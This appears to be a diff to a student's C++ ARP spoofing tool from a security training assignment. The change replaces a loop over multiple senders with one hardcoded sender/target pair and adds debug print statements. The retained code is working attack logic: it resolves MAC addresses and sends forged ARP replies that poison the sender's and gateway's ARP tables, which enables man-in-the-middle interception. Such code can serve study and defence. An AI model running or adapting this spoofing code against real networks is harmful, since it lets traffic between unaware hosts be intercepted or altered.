@@ -68,12 +68,14 @@ int main(int argc, char* argv[]) {
 
     char track[] = "개발";
     char name[] = "임창현";
-    printf("[bob10][%s]send-arp[%s]\n", track, name);
+    // printf("[bob10][%s]send-arp[%s]\n", track, name);
+    printf("line 72");
 
     if (argc < 3) {
         usage();
         return -1;
     }
+    printf("line 78");
 
     // Take argv
     char* dev = argv[1];
@@ -82,32 +84,50 @@ int main(int argc, char* argv[]) {
     Mac my_mac = Mac(getmac());
     Ip my_ip = Ip(getip(dev));
     Ip tip = Ip(argv[3]);
+    printf("line 87");
 
     // store argv values
     Info *sender_group = (Info*)malloc(sizeof(Info) * (argc-2));
-    for(int i = 0; i < (argc - 2); i++) {
-        sender_group[i].sender_ip = Ip(argv[i+2]);
-        sender_group[i].target_ip = Ip(argv[i+3]);
-    }
+//    for(int i = 0; i < (argc - 2); i++) {
+//        sender_group[i].sender_ip = Ip(argv[i+2]);
+//        sender_group[i].target_ip = Ip(argv[i+3]);
+//    }
+
+    sender_group[0].sender_ip = Ip(argv[2]);
+    sender_group[0].target_ip = Ip(argv[3]);
+    printf("line 98");
 
     // get gateway mac address
     send_arp_packet(1, dev, what_mac, my_mac, my_mac, my_ip, tmac, tip);
+    printf("send to gateway");
     Mac gateway_mac = receive_arp_reply(dev, tip);
 
     // Attack to Senders' ARP Table...
-    for(int j = 0; j < (argc - 2); j++) {
-        send_arp_packet(1, dev, what_mac, my_mac, my_mac, my_ip, tmac, sender_group[j].sender_ip);
-        printf("Sended ARP Packet to Sender%d\n", j);
+//    for(int j = 0; j < (argc - 2); j++) {
+//        send_arp_packet(1, dev, what_mac, my_mac, my_mac, my_ip, tmac, sender_group[j].sender_ip);
+//        printf("Sended ARP Packet to Sender%d\n", j);
 
-        sender_group[j].sender_mac = Mac(receive_arp_reply(dev, sender_group[j].sender_ip));
-        printf("Sender%d's Mac Address is %s\n", j, ((std::string)sender_group[j].sender_mac).c_str());
+//        sender_group[j].sender_mac = Mac(receive_arp_reply(dev, sender_group[j].sender_ip));
+//        printf("Sender%d's Mac Address is %s\n", j, ((std::string)sender_group[j].sender_mac).c_str());
 
-        send_arp_packet(2, dev, sender_group[j].sender_mac, my_mac, my_mac, sender_group[j].target_ip, sender_group[j].sender_mac, sender_group[j].sender_ip);
-        printf("Sended Arp Reply Packet to Sender%d\n", j);
+//        send_arp_packet(2, dev, sender_group[j].sender_mac, my_mac, my_mac, sender_group[j].target_ip, sender_group[j].sender_mac, sender_group[j].sender_ip);
+//        printf("Sended Arp Reply Packet to Sender%d\n", j);
 
-        send_arp_packet(2, dev, gateway_mac, sender_group[j].sender_mac, my_mac, sender_group[j].sender_ip, gateway_mac, sender_group[j].target_ip);
-        printf("Sended ARP Reply Packet to attack Target's ARP TABLE where is sender%d", j);
-    }
+//        send_arp_packet(2, dev, gateway_mac, sender_group[j].sender_mac, my_mac, sender_group[j].sender_ip, gateway_mac, sender_group[j].target_ip);
+//        printf("Sended ARP Reply Packet to attack Target's ARP TABLE where is sender%d", j);
+//    }
+
+    send_arp_packet(1, dev, what_mac, my_mac, my_mac, my_ip, tmac, sender_group[0].sender_ip);
+    printf("Sended ARP Packet to Sender%d\n", 0);
+
+    sender_group[0].sender_mac = Mac(receive_arp_reply(dev, sender_group[0].sender_ip));
+    printf("Sender%d's Mac Address is %s\n", 0, ((std::string)sender_group[0].sender_mac).c_str());
+
+    send_arp_packet(2, dev, sender_group[0].sender_mac, my_mac, my_mac, sender_group[0].target_ip, sender_group[0].sender_mac, sender_group[0].sender_ip);
+    printf("Sended Arp Reply Packet to Sender%d\n", 0);
+
+    send_arp_packet(2, dev, gateway_mac, sender_group[0].sender_mac, my_mac, sender_group[0].sender_ip, gateway_mac, sender_group[0].target_ip);
+    printf("Sended ARP Reply Packet to attack Target's ARP TABLE where is sender%d", 0);
 
     // Open Packet Handler
     char errbuf[PCAP_ERRBUF_SIZE];
